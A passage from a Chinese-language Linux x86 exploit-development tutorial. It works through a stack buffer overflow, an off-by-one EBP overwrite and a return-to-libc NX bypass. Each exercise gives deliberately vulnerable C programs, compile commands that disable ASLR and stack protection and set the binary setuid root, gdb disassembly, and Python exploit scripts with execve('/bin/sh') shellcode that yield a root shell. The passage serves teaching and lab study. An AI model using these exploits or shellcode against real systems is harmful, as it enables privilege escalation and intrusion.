class="number">47</span>&gt;:  call   <span class="number">0x80483c0</span> &lt;<span class="built_in">exit</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x0804855e</span> &lt;+<span class="number">52</span>&gt;:  mov    eax,**DWORD** PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">   <span class="number">0x08048561</span> &lt;+<span class="number">55</span>&gt;:  add    eax,<span class="number">0x4</span>  </span><br><span class="line">   <span class="number">0x08048564</span> &lt;+<span class="number">58</span>&gt;:  mov    eax,**DWORD** PTR [eax]  </span><br><span class="line">   <span class="number">0x08048566</span> &lt;+<span class="number">60</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048569</span> &lt;+<span class="number">63</span>&gt;:  call   <span class="number">0x8048499</span> &lt;validate_uname&gt;  </span><br><span class="line">   <span class="number">0x0804856e</span> &lt;+<span class="number">68</span>&gt;:  mov    eax,**DWORD** PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">   <span class="number">0x08048571</span> &lt;+<span class="number">71</span>&gt;:  add    eax,<span class="number">0x8</span>  </span><br><span class="line">   <span class="number">0x08048574</span> &lt;+<span class="number">74</span>&gt;:  mov    eax,**DWORD** PTR [eax]  </span><br><span class="line">   <span class="number">0x08048576</span> &lt;+<span class="number">76</span>&gt;:  mov    **DWORD** PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048579</span> &lt;+<span class="number">79</span>&gt;:  call   <span class="number">0x804849e</span> &lt;validate_passwd&gt;  </span><br><span class="line">   <span class="number">0x0804857e</span> &lt;+<span class="number">84</span>&gt;:  mov    eax,<span class="number">0x0</span>  </span><br><span class="line">   <span class="number">0x08048583</span> &lt;+<span class="number">89</span>&gt;:  leave    </span><br><span class="line">   <span class="number">0x08048584</span> &lt;+<span class="number">90</span>&gt;:  ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>

<p>堆栈布局：</p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu5.png" title="图5">

<p>由于我们已经知道长度为<code>261</code>的密码，所以绕过边界检查，并允许我们覆盖堆栈中的返回地址。让我们通过发送一系列的A来测试它。</p>
<p><strong>测试步骤1：是否可以覆盖返回地址？</strong></p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu6.png" title="图6">

<p>发现可以溢出，并且<code>eip</code>已经被<code>AAAA</code>覆盖了。</p>
<p><strong>测试步骤2：目的缓冲区的偏移量是多少？</strong></p>
<p>这里让我们从缓冲区<code>passwd_buf</code>中找出什么偏移返回地址。反汇编并绘制了<code>validate_passwd（）</code>的堆栈布局，现在可以尝试找到偏移位置信息。</p>
<p>首先是<code>0xb</code>个大小的<code>buf[]</code>,然后是<code>0x1</code>大小的<code>passwd_len</code>，然后是<code>0x4</code>个大小的对齐空间，最后是<code>0x4</code>个大小的<code>edi</code>和<code>0x4</code>个大小的调用者的<code>ebp</code>指针。</p>
<p><code>0x18 = 0xb + 0x1 + 0x4 + 0x4 + 0x4</code>  </p>
<p>因此，用户输入的<code>“A” * 24 + “B” * 4 + “C” * 233</code>，以A覆盖<code>passwd_buf</code>，<code>passwd_len</code>，<code>对齐空间</code>，<code>edi</code>和调用者的<code>ebp</code>，以<code>BBBB</code>覆盖返回地址，以<code>C</code>覆盖剩余空间</p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu7.png" title="图7">

<p>发现<code>eip</code>已经被<code>BBBB</code>覆盖了。然后我们就能用上述漏洞编写一个攻击代码<code>exp.py</code></p>
<p>攻击代码：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#exp.py   </span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"> <span class="keyword">import</span> struct  </span><br><span class="line"> <span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line"> arg1 = <span class="string">"sploitfun"</span>  </span><br><span class="line"> <span class="comment">#Stack address where shellcode is copied.  </span></span><br><span class="line"> ret_addr = <span class="number">0xbffff274</span>  </span><br><span class="line"> <span class="comment">#Spawn a shell  </span></span><br><span class="line"> <span class="comment">#execve(/bin/sh)  </span></span><br><span class="line"> scode =   <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"</span>  </span><br><span class="line"><span class="comment">#endianess convertion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)  <span class="comment">#unk + RA + NOP's + Shellcode  </span></span><br><span class="line">arg2 = <span class="string">"A"</span> * <span class="number">24</span>  </span><br><span class="line">arg2 += conv(ret_addr);  </span><br><span class="line">arg2 += <span class="string">"\x90"</span> * <span class="number">100</span>  </span><br><span class="line">arg2 += scode  </span><br><span class="line">arg2 += <span class="string">"C"</span> * <span class="number">108</span>  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./test"</span>, arg1, arg2])</span><br></pre></td></tr></table></figure>

<p>执行上面的<code>exp.py</code>程序，给我们<code>root shell</code></p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu8.png" title="图8">

<hr>
<h2 id="Off-By-One-漏洞-基于栈"><a href="#Off-By-One-漏洞-基于栈" class="headerlink" title="Off-By-One 漏洞 (基于栈)"></a>Off-By-One 漏洞 (基于栈)</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p>
<p>将字符串复制到目标缓冲区可能导致<code>off by one</code>。当<code>源字符串长度等于目标缓冲区长度</code>，单个<code>null</code>字节将被复制到目标缓冲区上方。这里由于目标缓冲区位于堆栈中，所以单个null字节可以覆盖存储在堆栈中的调用者的ebp的最低有效位，这可能导致任意代码的执行。</p>
<p><strong>漏洞代码：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;  </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span></span>;   </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;  </span><br><span class="line"> bar(arg); <span class="comment">/* [1] */</span>  </span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;  </span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">256</span>];  </span><br><span class="line"><span class="built_in">strcpy</span>(buf, arg); <span class="comment">/* [2] */</span>  </span><br><span class="line">&#125;  </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;  </span><br><span class="line">   <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>])&gt;<span class="number">256</span>) &#123; <span class="comment">/* [3] */</span>  </span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">"Attempted Buffer Overflow\n"</span>);  </span><br><span class="line">         fflush(<span class="built_in">stdout</span>);  </span><br><span class="line">         <span class="keyword">return</span> <span class="number">-1</span>;  </span><br><span class="line">   &#125;  </span><br><span class="line">   foo(argv[<span class="number">1</span>]); <span class="comment">/* [4] */</span>  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> <strong>编译命令：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -fno-<span class="built_in">stack</span>-protector -z execstack -mpreferred-<span class="built_in">stack</span>-boundary=<span class="number">2</span> -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure>

<p>上述漏洞代码的<code>第[2]行</code>是可能发生<code>off by one</code>溢出的地方。目标缓冲区长度为256，因此长度为256字节的源字符串可能导致任意代码执行。</p>
<p>使用称为<code>EBP覆盖</code>的技术实现任意代码执行。如果调用者的<code>EBP</code>位于目标缓冲区之上，则在<code>strcpy</code>之后，单个<code>NULL</code>字节将覆盖调用者<code>EBP</code>的<code>LSB</code>。</p>
<p><strong>反汇编：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"> gdb-peda$ <span class="built_in">set</span> disassembly intel  </span><br><span class="line"> gdb-peda$ disass main  </span><br><span class="line"> Dump of assembler code <span class="keyword">for</span> function main:  </span><br><span class="line">     <span class="number">0x08048497</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">     <span class="number">0x08048498</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">     <span class="number">0x0804849a</span> &lt;+<span class="number">3</span>&gt;:   push   edi  </span><br><span class="line">     <span class="number">0x0804849b</span> &lt;+<span class="number">4</span>&gt;:   sub    esp,<span class="number">0x8</span>  </span><br><span class="line">     <span class="number">0x0804849e</span> &lt;+<span class="number">7</span>&gt;:   mov    eax,DWORD PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">    <span class="number">0x080484a1</span> &lt;+<span class="number">10</span>&gt;:  add    eax,<span class="number">0x4</span>  </span><br><span class="line">    <span class="number">0x080484a4</span> &lt;+<span class="number">13</span>&gt;:  mov    eax,DWORD PTR [eax]  </span><br><span class="line">    <span class="number">0x080484a6</span> &lt;+<span class="number">15</span>&gt;:  mov    DWORD PTR [ebp<span class="number">-0x8</span>],<span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="number">0x080484ad</span> &lt;+<span class="number">22</span>&gt;:  mov    edx,eax  </span><br><span class="line">    <span class="number">0x080484af</span> &lt;+<span class="number">24</span>&gt;:  mov    eax,<span class="number">0x0</span>  </span><br><span class="line">    <span class="number">0x080484b4</span> &lt;+<span class="number">29</span>&gt;:  mov    ecx,DWORD PTR [ebp<span class="number">-0x8</span>]  </span><br><span class="line">    <span class="number">0x080484b7</span> &lt;+<span class="number">32</span>&gt;:  mov    edi,edx  </span><br><span class="line">    <span class="number">0x080484b9</span> &lt;+<span class="number">34</span>&gt;:  repnz scas al,BYTE PTR es:[edi]  </span><br><span class="line">    <span class="number">0x080484bb</span> &lt;+<span class="number">36</span>&gt;:  mov    eax,ecx  </span><br><span class="line">    <span class="number">0x080484bd</span> &lt;+<span class="number">38</span>&gt;:  <span class="keyword">not</span>    eax  </span><br><span class="line">    <span class="number">0x080484bf</span> &lt;+<span class="number">40</span>&gt;:  sub    eax,<span class="number">0x1</span>  </span><br><span class="line">    <span class="number">0x080484c2</span> &lt;+<span class="number">43</span>&gt;:  cmp    eax,<span class="number">0x100</span>  </span><br><span class="line">    <span class="number">0x080484c7</span> &lt;+<span class="number">48</span>&gt;:  jbe    <span class="number">0x80484e9</span> &lt;main+<span class="number">82</span>&gt;  </span><br><span class="line">    <span class="number">0x080484c9</span> &lt;+<span class="number">50</span>&gt;:  mov    DWORD PTR [esp],<span class="number">0x80485e0</span>  </span><br><span class="line">    <span class="number">0x080484d0</span> &lt;+<span class="number">57</span>&gt;:  call   <span class="number">0x8048380</span> &lt;<span class="built_in">puts</span>@plt&gt;  </span><br><span class="line">    <span class="number">0x080484d5</span> &lt;+<span class="number">62</span>&gt;:  mov    eax,ds:<span class="number">0x804a020</span>  </span><br><span class="line">    <span class="number">0x080484da</span> &lt;+<span class="number">67</span>&gt;:  mov    DWORD PTR [esp],eax  </span><br><span class="line">    <span class="number">0x080484dd</span> &lt;+<span class="number">70</span>&gt;:  call   <span class="number">0x8048360</span> &lt;fflush@plt&gt;  </span><br><span class="line">    <span class="number">0x080484e2</span> &lt;+<span class="number">75</span>&gt;:  mov    eax,<span class="number">0xffffffff</span>  </span><br><span class="line">    <span class="number">0x080484e7</span> &lt;+<span class="number">80</span>&gt;:  jmp    <span class="number">0x80484fe</span> &lt;main+<span class="number">103</span>&gt;  </span><br><span class="line">    <span class="number">0x080484e9</span> &lt;+<span class="number">82</span>&gt;:  mov    eax,DWORD PTR [ebp+<span class="number">0xc</span>]  </span><br><span class="line">    <span class="number">0x080484ec</span> &lt;+<span class="number">85</span>&gt;:  add    eax,<span class="number">0x4</span>  </span><br><span class="line">    <span class="number">0x080484ef</span> &lt;+<span class="number">88</span>&gt;:  mov    eax,DWORD PTR [eax]  </span><br><span class="line">    <span class="number">0x080484f1</span> &lt;+<span class="number">90</span>&gt;:  mov    DWORD PTR [esp],eax  </span><br><span class="line">    <span class="number">0x080484f4</span> &lt;+<span class="number">93</span>&gt;:  call   <span class="number">0x8048464</span> &lt;foo&gt;  </span><br><span class="line">    <span class="number">0x080484f9</span> &lt;+<span class="number">98</span>&gt;:  mov    eax,<span class="number">0x0</span>  </span><br><span class="line">   <span class="number">0x080484fe</span> &lt;+<span class="number">103</span>&gt;: add    esp,<span class="number">0x8</span>  </span><br><span class="line">   <span class="number">0x08048501</span> &lt;+<span class="number">106</span>&gt;: pop    edi  </span><br><span class="line">   <span class="number">0x08048502</span> &lt;+<span class="number">107</span>&gt;: pop    ebp  </span><br><span class="line">   <span class="number">0x08048503</span> &lt;+<span class="number">108</span>&gt;: ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$   </span><br><span class="line">gdb-peda$ disass bar  </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function bar:  </span><br><span class="line">    <span class="number">0x08048477</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">    <span class="number">0x08048478</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">    <span class="number">0x0804847a</span> &lt;+<span class="number">3</span>&gt;:   sub    esp,<span class="number">0x108</span>  </span><br><span class="line">    <span class="number">0x08048480</span> &lt;+<span class="number">9</span>&gt;:   mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>] </span><br><span class="line">   <span class="number">0x08048483</span> &lt;+<span class="number">12</span>&gt;:  mov    DWORD PTR [esp+<span class="number">0x4</span>],eax  </span><br><span class="line">   <span class="number">0x08048487</span> &lt;+<span class="number">16</span>&gt;:  lea    eax,[ebp<span class="number">-0x100</span>]  </span><br><span class="line">   <span class="number">0x0804848d</span> &lt;+<span class="number">22</span>&gt;:  mov    DWORD PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048490</span> &lt;+<span class="number">25</span>&gt;:  call   <span class="number">0x8048370</span> &lt;<span class="built_in">strcpy</span>@plt&gt;  </span><br><span class="line">   <span class="number">0x08048495</span> &lt;+<span class="number">30</span>&gt;:  leave    </span><br><span class="line">   <span class="number">0x08048496</span> &lt;+<span class="number">31</span>&gt;:  ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$ disass foo  </span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function foo:  </span><br><span class="line">   <span class="number">0x08048464</span> &lt;+<span class="number">0</span>&gt;:   push   ebp  </span><br><span class="line">   <span class="number">0x08048465</span> &lt;+<span class="number">1</span>&gt;:   mov    ebp,esp  </span><br><span class="line">   <span class="number">0x08048467</span> &lt;+<span class="number">3</span>&gt;:   sub    esp,<span class="number">0x4</span>  </span><br><span class="line">   <span class="number">0x0804846a</span> &lt;+<span class="number">6</span>&gt;:   mov    eax,DWORD PTR [ebp+<span class="number">0x8</span>]  </span><br><span class="line">   <span class="number">0x0804846d</span> &lt;+<span class="number">9</span>&gt;:   mov    DWORD PTR [esp],eax  </span><br><span class="line">   <span class="number">0x08048470</span> &lt;+<span class="number">12</span>&gt;:  call   <span class="number">0x8048477</span> &lt;bar&gt;  </span><br><span class="line">   <span class="number">0x08048475</span> &lt;+<span class="number">17</span>&gt;:  leave    </span><br><span class="line">   <span class="number">0x08048476</span> &lt;+<span class="number">18</span>&gt;:  ret      </span><br><span class="line">End of assembler dump.  </span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>



<p><strong>堆栈布局：</strong></p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu9.png" title="图9">



<p>当我们已经知道<code>256字节</code>的用户输入，用空字节可以覆盖<code>foo的EBP的LSB</code>。所以当<code>foo</code>的存储在目标缓冲区<code>buf</code>之上的<code>EBP</code>被一个<code>NULL</code>字节所覆盖时，<code>ebp</code>从<code>0xbffff2d8</code>变为<code>0xbffff200</code>。从堆栈布局我们可以看到堆栈位置<code>0xbffff200</code>是目标缓冲区<code>buf</code>的一部分，由于用户输入被复制到该目标缓冲区，攻击者可以控制这个堆栈位置<code>0xbffff200</code>，因此他控制指令指针<code>eip</code>使用他可以实现任意代码执行。让我们通过发送一系列256的<code>A</code>来测试它。</p>
<p><strong>测试步骤1：EBP是否覆盖，从而可能覆盖返回地址？</strong></p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu10.png" title="图10">

<p>显示<code>eip</code>已经被<code>AAAA</code>覆盖。</p>
<p>返回地址位于<code>buf</code>的偏移量<code>0xac</code>处。有了这些信息，我们可以编写一个漏洞利用程序来实现任意的代码执行。</p>
<p><strong>漏洞代码：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#exp.py  </span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"> <span class="keyword">import</span> struct </span><br><span class="line"> <span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line"> <span class="comment">#Spawn a shell.   </span></span><br><span class="line"> <span class="comment">#execve(/bin/sh) Size- 28 bytes.  </span></span><br><span class="line"> scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90"</span>  </span><br><span class="line"> ret_addr = <span class="number">0xbffff218</span>  </span><br><span class="line"> <span class="comment">#endianess conversion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line"> <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num)   <span class="comment">#turn Address + NOP's + Shellcode + Junk  </span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">172</span>  </span><br><span class="line">buf += conv(ret_addr)  </span><br><span class="line">buf += <span class="string">"\x90"</span> * <span class="number">30</span>  </span><br><span class="line">buf += scode  </span><br><span class="line">buf += <span class="string">"A"</span> * <span class="number">22</span>  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./test"</span>, buf])</span><br></pre></td></tr></table></figure>

<p>执行上面的exploit程序给我们root shell，如下所示：</p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu11.png" title="图11">

<hr>
<h2 id="使用return-to-libc绕过NX-bit"><a href="#使用return-to-libc绕过NX-bit" class="headerlink" title="使用return-to-libc绕过NX bit"></a>使用return-to-libc绕过NX bit</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p>
<p><strong>NT Bit</strong>是一种利用缓解技术，使某些内存区域不可执行，并使可执行区域不可写。比如，使数据，堆栈和堆段不可执行，而代码段不可写。在<code>NX Bit</code>打开的情况下，我们基于堆栈的缓冲区溢出的经典方式会失败。应为在经典的方法中，<code>shellcode</code>被复制进堆栈中，返回地址指向<code>shellcode</code>。但是现在由于堆栈不再可执行，我们利用漏洞渗透失败！但是这种环节技术并不是万无一失的。还是有方法绕过<code>NX Bit</code>的。</p>
<p><strong>漏洞代码：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">   <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [1] */</span>   </span><br><span class="line">   <span class="built_in">strcpy</span>(buf,argv[<span class="number">1</span>]); <span class="comment">/* [2] */</span>  </span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"%s\n"</span>,buf); <span class="comment">/* [3] */</span>  </span><br><span class="line">   fflush(<span class="built_in">stdout</span>);  <span class="comment">/* [4] */</span>  </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> <strong>编译命令：</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#echo 0 &gt; /proc/sys/kernel/randomize_va_space  </span></span><br><span class="line">$gcc -g -fno-<span class="built_in">stack</span>-protector -o test test.c  </span><br><span class="line">$sudo chown root test  </span><br><span class="line">$sudo chgrp root test  </span><br><span class="line">$sudo chmod +s test</span><br></pre></td></tr></table></figure>

<p>我们可以使用叫做<code>return-to-libc</code>的攻击技术绕过<code>NX bit</code>。这里返回地址被一个特定的<code>libc</code>函数地址覆盖。比如，如果攻击者想要生成一个<code>shell</code>，那么它将使用<code>system（）</code>地址覆盖返回地址，并在堆栈中设置<code>system（）</code>所需的相应参数，以便调用它。在已经放汇编红会之了漏洞代码的堆栈布局后，让我们编写一个漏洞代码来绕过<code>NX</code>位</p>
<p><strong>攻击代码：</strong></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">#exp.py  </span></span><br><span class="line"> <span class="comment">#!/usr/bin/env python  </span></span><br><span class="line"> <span class="keyword">import</span> struct</span><br><span class="line"> <span class="keyword">from</span> subprocess <span class="keyword">import</span> call  </span><br><span class="line"> <span class="comment">#Since ALSR is disabled, libc base address would remain constant and hence we can easily find the function address we want by adding the offset to it.   </span></span><br><span class="line"> <span class="comment">#For example system address = libc base address + system offset  </span></span><br><span class="line"> <span class="comment">#where   </span></span><br><span class="line">        <span class="comment">#libc base address = 0xb7e22000 (Constant address, it can also be obtained from cat /proc//maps)  </span></span><br><span class="line">        <span class="comment">#system offset     = 0x0003f060 (obtained from "readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system")  </span></span><br><span class="line">         system = <span class="number">0xb7e5d0b0</span>        <span class="comment">#0xb7e2000+0x0003f060  </span></span><br><span class="line">         exit = <span class="number">0xb7e50bf0</span>          <span class="comment">#0xb7e2000+0x00032be0     </span></span><br><span class="line">        <span class="comment">#system_arg points to 'sh' substring of 'fflush' string.   </span></span><br><span class="line">        <span class="comment">#To spawn a shell, system argument should be 'sh' and hence this is the reason for adding line [4] in vuln.c.   </span></span><br><span class="line">        <span class="comment">#But incase there is no 'sh' in vulnerable binary, we can take the other approach of pushing 'sh' string at the end of user input!!  </span></span><br><span class="line">system_arg = <span class="number">0xb7f816a0</span>     <span class="comment">#(obtained from hexdump output of the binary)    </span></span><br><span class="line"><span class="comment">#endianess conversion  </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conv</span><span class="params">(num)</span>:</span>  </span><br><span class="line">     <span class="keyword">return</span> struct.pack(<span class="string">"&lt;I"</span>,num) <span class="comment">#system + exit + system_arg  </span></span><br><span class="line">buf = <span class="string">"A"</span> * <span class="number">268</span>  </span><br><span class="line">buf += conv(system)  </span><br><span class="line">buf += conv(exit)  </span><br><span class="line">buf += conv(system_arg)  </span><br><span class="line"><span class="keyword">print</span> <span class="string">"Calling vulnerable program"</span>  </span><br><span class="line">call([<span class="string">"./test"</span>, buf])</span><br></pre></td></tr></table></figure>

<p>漏洞代码中，需要3个地址。分别为<code>system()</code>，<code>exit()</code>，还有字符<code>sh</code>所在的地址。可以直接用<code>gdb</code>打印出<code>system()</code>,<code>exit()</code>函数的地址。<code>sh</code>字符串的地址可以使用<code>peda</code>插件的<code>find</code>功能直接查找。具体做法如下图所示：</p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu12.png" title="图12">



<p>然后运行<code>exp.py</code>便可以成功渗透，并给我们<code>shellcode</code>:</p>
<img src="/2019/07/20/Linux%20(x86)%20Exploit%20开发系列教程/tu13.png" title="图13">

<hr>
<h2 id="使用链接的return-to-libc绕过NX-bit"><a href="#使用链接的return-to-libc绕过NX-bit" class="headerlink" title="使用链接的return-to-libc绕过NX bit"></a>使用链接的return-to-libc绕过NX bit</h2><p>虚拟机安装：Ubuntu 12.04（x86）</p>
<p>有需要攻击者为了成功利用需要调用<code>多个libc</code>函数。链接<code>多个libc</code>函数的一种简单方法是在堆栈中放置一个<code>libc函数</code>地址，但是由于函数参数的原因，所以是不可能的。所以需要用链接的方式绕过检测机制。</p>
<p><strong>漏洞代码：</strong></p>
